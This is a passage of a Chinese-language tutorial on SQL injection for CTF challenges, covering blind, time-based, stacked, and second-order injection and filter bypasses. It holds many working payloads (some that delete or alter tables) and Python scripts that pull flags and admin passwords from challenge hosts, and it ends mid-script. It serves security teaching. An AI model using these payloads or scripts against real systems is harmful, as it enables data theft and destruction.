class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">该方法只适用于表里就一行数据的时候。</span><br></pre></td></tr></table></figure><p>如果注入的时候没有报错，我们又不知道列名，就只能用 order by 盲注了。当然，在 过滤了括号 的时候，order by 盲注也是个很好的办法。<br>order by 的主要作用就是让查询出来的数据根据第n列进行排序（默认升序），我们可以使用order by排序比较字符的 ascii 码大小，从第⼀位开始比较，第⼀位相同时比较下⼀位。<br>利用方式参见如下测试：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from admin where username=&#x27;&#x27; or 1 union select 1,2,&#x27;5&#x27; order by 3;</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">| id | username | password                         |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">|  1 | 2        | 5                                |</span><br><span class="line">|  1 | admin    | 51b7a76d51e70b419f60d3473fb6f900 |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from admin where username=&#x27;&#x27; or 1 union select 1,2,&#x27;6&#x27; order by 3;</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">| id | username | password                         |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">|  1 | admin    | 51b7a76d51e70b419f60d3473fb6f900 |</span><br><span class="line">|  1 | 2        | 6                                |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">2 rows in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from admin where username=&#x27;&#x27; or 1 union select 1,2,&#x27;51&#x27; order by 3;</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">| id | username | password                         |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">|  1 | 2        | 51                               |</span><br><span class="line">|  1 | admin    | 51b7a76d51e70b419f60d3473fb6f900 |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from admin where username=&#x27;&#x27; or 1 union select 1,2,&#x27;52&#x27; order by 3;</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">| id | username | password                         |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">|  1 | admin    | 51b7a76d51e70b419f60d3473fb6f900 |</span><br><span class="line">|  1 | 2        | 52                               |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>通过逐位判断便可得到password</p><p>参考脚本：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"># 定义一个flag取值的一个“范围”</span><br><span class="line">dic = &quot;1234567890qwertyuioplkjhgfdsazxcvbnmQWERTYUIOPLKJHGFDSAZXCVBNM_!@#$%^&amp;*&quot;</span><br><span class="line"># 之所以不定义为空，而是“^”，是为了从头开始匹配</span><br><span class="line">flag = &quot;^&quot;</span><br><span class="line"># 目标url，先传“|1”，获取其数据的排列内容，作为一个对比的基准</span><br><span class="line">url1 = &quot;https://chall.tasteless.eu/level1/index.php?dir=|1&quot;</span><br><span class="line">content1 = requests.get(url1).content</span><br><span class="line"># 这个flag的长度被定义为了50个字符长度</span><br><span class="line">for i in range(50):</span><br><span class="line">    # 从定义的dic中挨个取1字符，拼凑payload</span><br><span class="line">    for letter in dic:</span><br><span class="line">        payload = flag + letter</span><br><span class="line">        #该url最后的“&#125;2b1”--&gt;&quot;&#125;+1&quot;</span><br><span class="line">        url2 = &quot;https://chall.tasteless.eu/level1/index.php?dir=|&#123;select (select flag from level1_flag) regexp &quot;+&quot;&#x27;&quot;+ payload +&quot;&#x27;&quot;+&quot;&#125;%2b1&quot;</span><br><span class="line">        print(url2)</span><br><span class="line">        # 获取实际注入后的排列内容</span><br><span class="line">        content2 = requests.get(url2).content</span><br><span class="line">        # 如果不相等，即为flag内容（为什么是不相等，而不是相等，因为在url2的最后又“+1”，即匹配成功则是“?dir=|2”，匹配不成功则是“?dir=|1”）</span><br><span class="line">        if(content1 != content2):</span><br><span class="line">            flag = payload</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>有的盲注既不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断，其实也是从另一个我们能控制的角度来判断了布尔值。</p><p>对于基于时间的盲注，通过构造真or假判断条件的sql语句， 且sql语句中根据需要联合使用sleep()函数一同向服务器发送请求， 观察服务器响应结果是否会执行所设置时间的延迟响应，以此来判断所构造条件的真or假（若执行sleep延迟，则表示当前设置的判断条件为真）；然后不断调整判断条件中的数值以逼近真实值，最终确定具体的数值大小or名称拼写。</p><p>首先使用以下payload，根据页面的响应是否有延迟来判断是否存在注入：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and sleep(5)#</span><br><span class="line">1 and sleep(5)</span><br></pre></td></tr></table></figure><p>时间盲注用到的SQL语法知识<br>一般的时间盲注主要就是使用sleep()函数进行时间的延迟，然后通过if判断是否执行sleep()：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27; and if(ascii(substr((select database()),1,1))&gt;1,sleep(3),0)#</span><br></pre></td></tr></table></figure><p>trim配合比较。</p><p>trim([both&#x2F;leading&#x2F;trailing] 目标字符串 FROM 源字符串)</p><p>从源字符串中去除首尾&#x2F;首&#x2F;尾的目标字符串，如寻找字符串第一位，假定X代表某字符，trim(leading X from ‘abcd’) &#x3D; trim(leading X+1 from ‘abcd’)不相等，说明正确结果是X或X+1再进行trim(leading X+1 from ‘abcd’) &#x3D; trim(leading X+2 from ‘abcd’) 相等则正确为X，不相等则X+1正确</p><p>若trim(leading X from ‘abcd’) &#x3D; trim(leading X+1 from ‘abcd’)相等说明X与X+1都为字符串的首字符，不存在这种情况，所以需要继续比较X+1与X+2直至相等</p><h3 id="注入流程-1"><a href="#注入流程-1" class="headerlink" title="注入流程"></a>注入流程</h3><p>时间盲注我们也是利用脚本完成：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">url = &#x27;http://474d31bb-1f69-4636-9798-319f27a7fb08.node3.buuoj.cn/Less-8/?id=&#x27;</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">for i in range(1,250):</span><br><span class="line">   low = 32</span><br><span class="line">   high = 128</span><br><span class="line">   mid = (low+high)//2</span><br><span class="line">   while(low&lt;high):</span><br><span class="line"></span><br><span class="line">       payload = &quot;http://474d31bb-1f69-4636-9798-319f27a7fb08.node3.buuoj.cn/Less-8/?id=1&#x27; and if((ascii(substr(database(),%d,1))&gt;%d),sleep(2),1)-- &quot; %(i,mid)</span><br><span class="line"></span><br><span class="line">       times = time.time()</span><br><span class="line">       res = requests.get(url=payload)</span><br><span class="line"></span><br><span class="line">       if time.time() - times &gt;= 2:      # 为真时，即判断正确的时候的条件</span><br><span class="line">           low = mid+1</span><br><span class="line">       else:</span><br><span class="line">           high = mid</span><br><span class="line">       mid = (low+high)//2</span><br><span class="line">   if(mid ==32 or mid ==127):</span><br><span class="line">       break</span><br><span class="line">   flag = flag+chr(mid)</span><br><span class="line">   print(flag)</span><br></pre></td></tr></table></figure><p>这是一个GET方式的时间盲注，更改脚本请求方式的方法可以参照上面的布尔盲注，这两个脚本的编写思路是一样的，只是在判断方式上有所区别。</p><p>时间盲注在CTF比赛和平时生产环境中都是比较常见的，但是当我们常⽤的函数被过滤的话，那该怎么办呢？还有以下几种时间盲注方式。</p><p>笛卡尔积延时盲注<br>count(*) 后面所有表中的列笛卡尔积数，数量越多越卡，就会有延迟，类似之前某比赛pgsql的延时注入也可以利用此来 打时间差，从而达到延时注入的效果：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C;</span><br><span class="line">+-----------+</span><br><span class="line">| count(*)  |</span><br><span class="line">+-----------+</span><br><span class="line">| 113101560 |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (2.07 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from ctf_test where user=&#x27;1&#x27; and 1=1 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C);</span><br><span class="line">+------+-----+</span><br><span class="line">| user | pwd |</span><br><span class="line">+------+-----+</span><br><span class="line">| 1    | 0   |</span><br><span class="line">+------+-----+</span><br><span class="line">1 row in set (2.08 sec)</span><br></pre></td></tr></table></figure><p>得到的结果都会有延迟。这里选用information_schema.columns表的原因是其内部数据较多，到时候可以根据实际情况调换。</p><p>那么我们就可以使用这个原理，并配合if()语句进行延时注入了，payload 与之前相似，类似如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27; and if(ascii(substr((select database()),1,1))&gt;1,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C),0)#</span><br><span class="line"></span><br><span class="line">[OUTPUT:]</span><br><span class="line">HTTP/1.1 504 Gateway Time-out    # 有很长的延时, 以至于Time-out了</span><br></pre></td></tr></table></figure><p>给出一个笛卡尔积延时注入脚本：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &#x27;http://4.c56083ac-9da0-437e-9b51-5db047b150aa.jvav.vnctf2021.node4.buuoj.cn:82/user/login&#x27;</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">for i in range(1,250):</span><br><span class="line">   low = 32</span><br><span class="line">   high = 128</span><br><span class="line">   mid = (low+high)//2</span><br><span class="line">   while(low&lt;high):</span><br><span class="line">       payload = &quot;&#x27; or if((select ascii(substr((select password from user where username=&#x27;admin&#x27;),%d,1)))&gt;%d,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C),1)#&quot; % (i, mid)</span><br><span class="line">       datas = &#123;</span><br><span class="line">                &quot;username&quot;:&quot;admin&quot;,</span><br><span class="line">                &quot;password&quot;: payload</span><br><span class="line">        &#125;</span><br><span class="line">       res = requests.post(url=url,data=datas,timeout=None)    # 不限制超时</span><br><span class="line"></span><br><span class="line">       if &#x27;504 Gateway Time-out&#x27; in res.text:      # 为真时，即判断正确的时候的条件</span><br><span class="line">           low = mid+1</span><br><span class="line">       else:</span><br><span class="line">           high = mid</span><br><span class="line">       mid = (low+high)//2</span><br><span class="line">   if(mid ==32 or mid ==127):</span><br><span class="line">       break</span><br><span class="line">   flag = flag+chr(mid)</span><br><span class="line">   print(flag)</span><br></pre></td></tr></table></figure><h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>在SQL中，分号; 是用来表示一条sql语句的结束。试想一下，我们在结束一个sql语句后继续构造下一条语句，会不会一起执行？ 因此这个想法也就造就了堆叠注入。</p><p>而联合注入也是将两条语句合并在一起，两者之间有什么区别么？</p><p>区别就在于 union 或者union all执行的语句类型是有限制的，可以用来执行的是查询语句，而堆叠注入可以执行的是任意的语句。 例如以下这个例子。用户输入：1; DELETE FROM products; 服务器端生成的sql语句为：select * from products where id&#x3D;1;DELETE FROM products; 当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p><p>但是，这种堆叠注入也是有局限性的。堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当然权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。</p><p>虽然我们前面提到了堆叠查询可以执行任意的sql语句，但是这种注入方式并不是十分的完美的。在有的Web系统中，因为代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生的错误或者执行结果只能被忽略，我们在前端界面是无法看到返回结果的。因此，在读取数据时，建议配合使用 union 联合注入。</p><p>一般存在堆叠注入的都是由于使用 mysqli_multi_query() 函数执行的sql语句，该函数可以执行一个或多个针对数据库的查询，多个查询用分号进行分隔。</p><h3 id="注入流程-2"><a href="#注入流程-2" class="headerlink" title="注入流程"></a>注入流程</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 读取数据</span><br><span class="line">/?id=1&#x27;;show databases;--+</span><br><span class="line">/?id=1&#x27;;show tables;--+</span><br><span class="line">/?id=1&#x27;;show tables from database_name;--+</span><br><span class="line">/?id=1&#x27;;show columns from table_name;--+</span><br><span class="line"></span><br><span class="line"># 读取文件</span><br><span class="line">/?id=1&#x27;;select load_file(&#x27;/flag&#x27;);--+</span><br><span class="line"></span><br><span class="line"># 修改数据表的结构</span><br><span class="line">/?id=1&#x27;;insert into users(id,username,password)values(20,&#x27;whoami&#x27;,&#x27;657260&#x27;);--+    # 插入数据</span><br><span class="line">/?id=1&#x27;;update users set password=&#x27;657260&#x27; where id&gt;0;--+    # 更改数据</span><br><span class="line">/?id=1&#x27;;delete from users where id=20;--+    # 删除数据</span><br><span class="line">/?id=1&#x27;;create table fake_users like users;--+    # 创建一个新表</span><br><span class="line">?id=1&#x27;;rename table old_table to new_table;--+    # 更改表名</span><br><span class="line">?id=1&#x27;;alter table users change old_column new_column varchar(100);--+    # 更改字段名</span><br></pre></td></tr></table></figure><p>下面是MySQL堆叠注入的几种常见姿势。</p><p>rename 修改表名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;rename table words to words1;rename table flag_here to words;#</span><br><span class="line"># rename命令用于修改表名。</span><br><span class="line"># rename命令格式：rename table 原表名 to 新表名;</span><br></pre></td></tr></table></figure><p>rename&#x2F;alter 修改表名与字段名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;rename table words to words1;rename table flag_here to words;alter table words change flag id varchar(100);#</span><br><span class="line"></span><br><span class="line">rename命令用于修改表名。</span><br><span class="line">rename命令格式：rename table 原表名 to 新表名;</span><br></pre></td></tr></table></figure><p>利用 HANDLER 语句<br>如果rename、alter被过滤了，我们可以借助HANDLER语句来bypass。在不更改表名的情况下读取另一个表中的数据。</p><p>HANDLER … OPEN 语句打开一个表，使其可以使用后续 HANDLER … READ 语句访问，该表对象未被其他会话共享，并且在会话调用 HANDLER … CLOSE 或会话终止之前不会关闭，详情请见：<a href="https://www.cnblogs.com/taoyaostudy/p/13479367.html">https://www.cnblogs.com/taoyaostudy/p/13479367.html</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;HANDLER FlagHere OPEN;HANDLER FlagHere READ FIRST;HANDLER FlagHere CLOSE;#</span><br><span class="line">或</span><br><span class="line">1&#x27;;HANDLER FlagHere OPEN;HANDLER FlagHere READ FIRST;#</span><br></pre></td></tr></table></figure><p>堆叠注入中的盲注<br>堆叠注入中的盲注往往是插入sql语句进行实践盲注，就比如 [SWPU2019]Web4 这道题。编写时间盲注脚本：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#author: c1e4r</span><br><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    #题目地址</span><br><span class="line">    url = &#x27;&#x27;&#x27;http://568215bc-57ff-4663-a8d9-808ecfb00f7f.node3.buuoj.cn/index.php?r=Login/Login&#x27;&#x27;&#x27;</span><br><span class="line">    #注入payload</span><br><span class="line">    payloads = &quot;asd&#x27;;set @a=0x&#123;0&#125;;prepare ctftest from @a;execute ctftest-- -&quot;</span><br><span class="line">    flag = &#x27;&#x27;</span><br><span class="line">    for i in range(1,30):</span><br><span class="line">        #查询payload</span><br><span class="line">        payload = &quot;select if(ascii(substr((select flag from flag),&#123;0&#125;,1))=&#123;1&#125;,sleep(3),1)&quot;</span><br><span class="line">        for j in range(0,128):</span><br><span class="line">            #将构造好的payload进行16进制转码和json转码</span><br><span class="line">            datas = &#123;&#x27;username&#x27;:payloads.format(str_to_hex(payload.format(i,j))),&#x27;password&#x27;:&#x27;test213&#x27;&#125;</span><br><span class="line">            data = json.dumps(datas)</span><br><span class="line">            times = time.time()</span><br><span class="line">            res = requests.post(url = url, data = data)</span><br><span class="line">            if time.time() - times &gt;= 3:</span><br><span class="line">                flag = flag + chr(j)</span><br><span class="line">                print(flag)</span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line">def str_to_hex(s):</span><br><span class="line">    return &#x27;&#x27;.join([hex(ord(c)).replace(&#x27;0x&#x27;, &#x27;&#x27;) for c in s])</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>这里还涉及到了一些json的内容，json.dumps() 是把python对象转换成json对象的一个过程，生成的是字符串。web服务中传输信息的一种方式。</p><h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><p>二次注入用到的SQL语法知识<br>通常二次注入的成因会是插入语句，我们控制自己想要查询的语句插入到数据库中再去找一个能显示插入数据的回显的地方（可能是登陆后的用户名等等、也有可能是删除后显示删除内容的地方~），恶意插入查询语句的示例如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into users(id,username,password,email) values(1,&#x27;0&#x27;+hex(database())+&#x27;0&#x27;,&#x27;0&#x27;+hex(hex(user()))+&#x27;0&#x27;,&#x27;123@qq.com&#x27;)</span><br><span class="line"></span><br><span class="line">insert into users(id,username,password,email) values(1,&#x27;0&#x27;+substr((select hex(hex(select * from flag))),1,10)+&#x27;0&#x27;,&#x27;123456&#x27;,&#x27;123@qq.com&#x27;)</span><br></pre></td></tr></table></figure><p>需要对后端的SQL语句有一个猜测</p><p>这里还有一个点，我们不能直接将要查询的函数插入，因为如果直接插入的话，’database()’会被识别为字符串，我们需要想办法闭合前后单引号的同时将我们的查询插入，就出现了’0’+database()+’0’这样的构造，但是这个的回显是0，但是在我们进行了hex编码之后就能正常的查询了，也就是上面出现的’0’+hex(database())+’0’</p><h3 id="注入流程-3"><a href="#注入流程-3" class="headerlink" title="注入流程"></a>注入流程</h3><p>首先找到插入点，通常情况下是一个注册页面，register.php这种，先简单的查看一下注册后有没有什么注册时写入的信息在之后又回显的，若有回显猜测为二次查询。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into users(id,username,password,email) values(1,&#x27;0&#x27;+hex(database())+&#x27;0&#x27;,&#x27;0&#x27;+hex(hex(user()))+&#x27;0&#x27;,&#x27;123@qq.com&#x27;)</span><br><span class="line"></span><br><span class="line">insert into users(id,username,password,email) values(1,&#x27;0&#x27;+substr((select hex(hex(select * from flag))),1,10)+&#x27;0&#x27;,&#x27;123456&#x27;,&#x27;123@qq.com&#x27;)</span><br></pre></td></tr></table></figure><p>构造类似于values中的参数进行注册等操作，然后进行查看，将hex编码解码即可，可能会有其他的先限制，比如超过10位就会转化为科学计数法，我们就需要使用from for语句来进行一个限制，可以编写脚本。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">import re as r</span><br><span class="line">import time</span><br><span class="line">ch = string.ascii_lowercase+string.digits+&#x27;-&#125;&#x27;+&#x27;&#123;&#x27;</span><br><span class="line"></span><br><span class="line">re = requests.session()</span><br><span class="line">url = &#x27;http://9a88c359-4f55-44e9-9332-4c635c486ef0.node3.buuoj.cn/&#x27;</span><br><span class="line"></span><br><span class="line">def register(email,username):</span><br><span class="line">    url1 = url+&#x27;register.php&#x27;</span><br><span class="line">    data = dict(email = email, username = username,password = &#x27;123&#x27;)</span><br><span class="line">    html = re.post(url1,data=data)</span><br><span class="line">    html.encoding = &#x27;utf-8&#x27;</span><br><span class="line">    return html</span><br><span class="line"></span><br><span class="line">def login(email):</span><br><span class="line">    url2 = url+&#x27;login.php&#x27;</span><br><span class="line">    data = dict(email = email,password = &#x27;123&#x27;)</span><br><span class="line">    html = re.post(url2, data=data)</span><br><span class="line">    html.encoding = &#x27;utf-8&#x27;</span><br><span class="line">    return html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">hex_flag = &#x27;&#x27;</span><br><span class="line">for j in range(0,17):</span><br><span class="line">    payload = &quot;0&#x27;+(select substr(hex(hex((select * from flag))) from &#123;&#125; for &#123;&#125;))+&#x27;0&quot;.format(int(j)*10+1,10)</span><br><span class="line">    email = &#x27;&#123;&#125;@qq.com&#x27;.format(str(j)+&#x27;14&#x27;)</span><br><span class="line">    html = register(email,payload)</span><br><span class="line">    # print html.text</span><br><span class="line">    html = login(email)</span><br><span class="line">    try:</span><br><span class="line">        res = r.findall(r&#x27;&lt;span class=&quot;user-name&quot;&gt;(.*?)&lt;/span&gt;&#x27;,html.text,r.S)</span><br><span class="line">        hex_flag += str(res[0]).strip()</span><br><span class="line">        print(hex_flag)</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line">    time.sleep(1)</span><br><span class="line">print( hex_flag.decode(&#x27;hex&#x27;).decode(&#x27;hex&#x27;))</span><br></pre></td></tr></table></figure><h2 id="常见绕过"><a href="#常见绕过" class="headerlink" title="常见绕过"></a>常见绕过</h2><h3 id="结尾注释符绕过"><a href="#结尾注释符绕过" class="headerlink" title="结尾注释符绕过"></a>结尾注释符绕过</h3><p>Mysql中常见的注释符</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">、#    %23    --+或-- -    ;%00</span><br></pre></td></tr></table></figure><p>如果所有的注释符全部被过滤了，把我们还可以尝试直接使用引号进行闭合，这种方法很好用。</p><h3 id="字符串变换绕过"><a href="#字符串变换绕过" class="headerlink" title="字符串变换绕过"></a>字符串变换绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 大小写绕过</span><br><span class="line">-1&#x27; UnIoN SeLeCt 1,2,database()--+</span><br><span class="line"></span><br><span class="line"># 双写绕过</span><br><span class="line">-1&#x27; uniunionon selselectect 1,2,database()--+</span><br><span class="line"></span><br><span class="line"># 字符串拼接绕过</span><br><span class="line">1&#x27;;set @a=concat(&quot;sel&quot;,&quot;ect * from users&quot;);prepare sql from @a;execute sql;</span><br></pre></td></tr></table></figure><h3 id="过滤-and、or-绕过"><a href="#过滤-and、or-绕过" class="headerlink" title="过滤 and、or 绕过"></a>过滤 and、or 绕过</h3><p>管道符</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and =&gt; &amp;&amp;</span><br><span class="line">or =&gt; ||</span><br></pre></td></tr></table></figure><h3 id="使用-进行异或盲注绕过"><a href="#使用-进行异或盲注绕过" class="headerlink" title="使用^进行异或盲注绕过"></a>使用^进行异或盲注绕过</h3><p>异或运算规则:<br>1^1&#x3D;0 0^0&#x3D;0 0^1&#x3D;1<br>1^1^1&#x3D;0 1^1^0&#x3D;0<br>构造payload:’^ascii(mid(database(),1,1)&#x3D;98)^0<br>注意这里会多加一个^0或1是因为在盲注的时候可能出现了语法错误也无法判断,而改变这里的0或1,如果返回的结果是不同的,那就可以证明语法是没有问题的.</p><h3 id="过滤空格绕过"><a href="#过滤空格绕过" class="headerlink" title="过滤空格绕过"></a>过滤空格绕过</h3><p>以下字符可以代替空格：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 使用注释符/**/代替空格:</span><br><span class="line">select/**/database();</span><br><span class="line"></span><br><span class="line"># 使用加号+代替空格:(只适用于GET方法中)</span><br><span class="line">select+database();</span><br><span class="line"># 注意: 加号+在URL中使⽤记得编码为%2B: select%2Bdatabase(); (python中不用)</span><br><span class="line"></span><br><span class="line"># 使⽤括号嵌套:</span><br><span class="line">select(group_concat(table_name))from(information_schema.taboles)where(tabel_schema=database());</span><br><span class="line"></span><br><span class="line"># 使⽤其他不可⻅字符代替空格:</span><br><span class="line">%09, %0a, %0b, %0c, %0d, %a0</span><br><span class="line"></span><br><span class="line">#利用``分隔进行绕过</span><br><span class="line">select host,user from user where user=&#x27;a&#x27;union(select`table_name`,`table_type`from`information_schema`.`tables`);</span><br></pre></td></tr></table></figure><p>同时任然可以利用异或符号进行盲注，我i们可以看到上面的payload中完全可以不存在空格。</p><h3 id="过滤括号绕过"><a href="#过滤括号绕过" class="headerlink" title="过滤括号绕过"></a>过滤括号绕过</h3><p>利用 order by 进行布尔盲注<br>上面有</p><h3 id="过滤比较符号（-、）绕过"><a href="#过滤比较符号（-、）绕过" class="headerlink" title="过滤比较符号（&#x3D;、&lt;、&gt;）绕过"></a>过滤比较符号（&#x3D;、&lt;、&gt;）绕过</h3><p>比较符号一般也只出现在盲注中，所以都尽可能搭配了脚本。</p><h3 id="使用-in-绕过"><a href="#使用-in-绕过" class="headerlink" title="使用 in() 绕过"></a>使用 in() 绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?id=&#x27; or ascii(substr((select database()),1,1)) in(114)--+    // 错误</span><br><span class="line">/?id=&#x27; or ascii(substr((select database()),1,1)) in(115)--+    // 正常回显</span><br><span class="line"></span><br><span class="line">/?id=&#x27; or substr((select database()),1,1) in(&#x27;s&#x27;)--+    // 正常回显</span><br></pre></td></tr></table></figure><p>综上所述，很明显和普通的布尔盲注差不多，于是写个GET的二分法盲注脚本：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://b8e2048e-3513-42ad-868d-44dbb1fba5ac.node3.buuoj.cn/Less-8/?id=&quot;</span><br><span class="line"></span><br><span class="line">payload = &quot;&#x27; or ascii(substr((select database()),&#123;0&#125;,1)) in(&#123;1&#125;)--+&quot;</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    for i in range(1, 100):</span><br><span class="line">        for j in range(37,128):</span><br><span class="line">            url = &quot;http://b8e2048e-3513-42ad-868d-44dbb1fba5ac.node3.buuoj.cn/Less-8/?id=&#x27; or ascii(substr((select database()),&#123;0&#125;,1)) in(&#123;1&#125;)--+&quot;.format(i,j)</span><br><span class="line">            r = requests.get(url=url)</span><br><span class="line">            if &quot;You are in&quot; in r.text:</span><br><span class="line">                flag += chr(j)</span><br><span class="line">                print(flag)</span><br></pre></td></tr></table></figure><h3 id="LIKE-注入"><a href="#LIKE-注入" class="headerlink" title="LIKE 注入"></a>LIKE 注入</h3><p>在LIKE子句中，百分比(%)通配符允许匹配任何字符串的零个或多个字符。下划线 _ 通配符允许匹配任何单个字符。匹配成功则返回1，反之返回0，可用于sql盲注。</p><ol><li><p>判断数据库长度<br>可用length()函数，也可用_，如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?id=&#x27; or database() like &#x27;________&#x27;--+  // 回显正常</span><br></pre></td></tr></table></figure></li><li><p>判断数据库名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?id=&#x27; or database() like &#x27;s%&#x27; --+</span><br><span class="line">/?id=&#x27; or (select database()) like &#x27;s%&#x27; --+</span><br><span class="line">或者:</span><br><span class="line">/?id=&#x27; or database() like &#x27;s_______&#x27; --+</span><br><span class="line">/?id=&#x27; or (select database()) like &#x27;s_______&#x27; --+</span><br></pre></td></tr></table></figure><p>如上图所示，回显正常，说明数据库名的第一个字符是s。</p></li></ol><p>综上所述，很明显和普通的布尔盲注差不多，于是写个GET的二分法盲注脚本：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line"># strs = string.printable</span><br><span class="line">strs = string.ascii_letters + string.digits + &#x27;_&#x27;</span><br><span class="line">url = &quot;http://b8e2048e-3513-42ad-868d-44dbb1fba5ac.node3.buuoj.cn/Less-8/?id=&quot;</span><br><span class="line"></span><br><span class="line">payload = &quot;&#x27; or (select database()) like &#x27;&#123;&#125;%&#x27;--+&quot;</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    name = &#x27;&#x27;</span><br><span class="line">    for i in range(1, 40):</span><br><span class="line">        char = &#x27;&#x27;</span><br><span class="line">        for j in strs:</span><br><span class="line">            payloads = payload.format(name + j)</span><br><span class="line">            urls = url + payloads</span><br><span class="line">            r = requests.get(urls)</span><br><span class="line">            if &quot;You are in&quot; in r.text:</span><br><span class="line">                name += j</span><br><span class="line">                print(j, end=&#x27;&#x27;)</span><br><span class="line">                char = j</span><br><span class="line">                break</span><br><span class="line">        if char == &#x27;#&#x27;:</span><br><span class="line">            break</span><br></pre></td></tr></table></figure><h3 id="REGEXP-注入"><a href="#REGEXP-注入" class="headerlink" title="REGEXP 注入"></a>REGEXP 注入</h3><p>REGEXP注入，即regexp正则表达式注入。REGEXP注入，又叫盲注值正则表达式攻击。应用场景就是盲注，原理是直接查询自己需要的数据，然后通过正则表达式进行匹配。</p><ol><li><p>判断数据库长度</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?id=&#x27; or (length(database())) regexp 8 --+  // 回显正常</span><br></pre></td></tr></table></figure></li><li><p>判断数据库名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?id=&#x27; or database() regexp &#x27;^s&#x27;--+    // 回显正常</span><br><span class="line">/?id=&#x27; or database() regexp &#x27;se&#x27;--+    // 回显正常, 不适用^和$进行匹配也可以</span><br><span class="line">/?id=&#x27; or database() regexp &#x27;^sa&#x27;--+   // 报错</span><br><span class="line">/?id=&#x27; or database() regexp &#x27;y$&#x27;--+    // 回显正常</span><br></pre></td></tr></table></figure></li></ol><p>脚本：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line"># strs = string.printable</span><br><span class="line">strs = string.ascii_letters + string.digits + &#x27;_&#x27;</span><br><span class="line">url = 